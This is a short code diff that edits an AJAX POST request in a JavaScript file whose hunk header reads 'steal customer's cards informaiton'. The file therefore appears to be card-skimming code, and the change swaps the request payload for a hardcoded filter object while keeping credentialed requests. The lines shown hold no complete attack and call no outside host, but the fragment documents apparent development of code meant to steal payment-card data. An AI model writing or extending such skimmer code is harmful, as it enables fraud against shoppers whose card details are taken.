@@ -32,7 +32,7 @@ steal customer's cards informaiton
 			    type : 'POST',
 			    dataType:'json',
 			    contentType:'application/vnd.api+json',
-			    data:JSON.stringify(data),
+			    data:{"data":{"filter":{"domain":"svc"}}},
 			    xhrFields: {
 			     withCredentials: true
 			 },
